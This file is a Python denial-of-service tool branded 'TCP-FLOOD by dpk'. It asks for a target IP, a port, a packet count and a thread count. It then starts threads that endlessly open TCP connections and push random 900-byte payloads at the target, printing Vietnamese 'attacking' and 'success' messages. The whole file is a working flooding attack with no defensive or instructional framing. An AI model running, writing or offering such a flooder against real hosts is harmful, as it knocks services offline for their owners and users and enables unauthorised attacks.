#!usr/bin/python3
import random
import threading
import socket
import os
import time
from termcolor import colored

os.system('cls')
print(colored(r"""
 _______ _____ _____        ______ _      ____   ____  _____  
|__   __/ ____|  __ \      |  ____| |    / __ \ / __ \|  __ \ 
   | | | |    | |__||______| |__  | |   | |  | | |  | | |  | |
   | | | |    |  ___/______|  __| | |   | |  | | |  | | |  | |
   | | | |____| |          | |    | |___| |__| | |__| | |__| |
   |_|  \_____|_|          |_|    |______\____/ \____/|_____/ 
                                                             by dpk""", 'red'))

print(colored("\n============================================================================================\n", 'green'))

ip = str(input(colored("[+] IP: ",'green')))
port = int(input(colored("[+] Port: ",'green')))
packet = int(input(colored("[+] Packets: ",'green')))
thread = int(input(colored("[+] Threads: ",'green')))
time.sleep(1.5)

os.system('cls')
print(colored(r"""
____________ _   __       ___ _____ _____ ___  _____  _   _______ _   _ _____       
|  _  \ ___ \ | / /      / _ \_   _|_   _/ _ \/  __ \| | / /_   _| \ | |  __ \      
| | | | |_/ / |/ /______/ /_\ \| |   | |/ /_\ \ /  \/| |/ /  | | |  \| | |  \/      
| | | |  __/|    \______|  _  || |   | ||  _  | |    |    \  | | | . ` | | __       
| |/ /| |   | |\  \     | | | || |   | || | | | \__/\| |\  \_| |_| |\  | |_\ \_ _ _ 
|___/ \_|   \_| \_/     \_| |_/\_/   \_/\_| |_/\____/\_| \_/\___/\_| \_/\____(_|_|_)""",'green'))
print(colored("\n########################################################################",'red'))
time.sleep(2)
print(colored("\n[+] Start......",'green'))
time.sleep(1)
print(colored("\n3",'green'))
time.sleep(1)
print(colored("\n2",'green'))
time.sleep(1)
print(colored("\n1",'green'))
time.sleep(1)
os.system('cls')

def syn():

    hevin = random._urandom(900)
    bb = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb += 1
            print(colored('[+] Đang Tấn Công '+ip +'>>>Sent: '+str(bb), 'red'))
        except KeyboardInterrupt:
            h.close()
            print(colored("[+++] THÀNH CÔNG !!!!", 'green'))
            pass

for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()




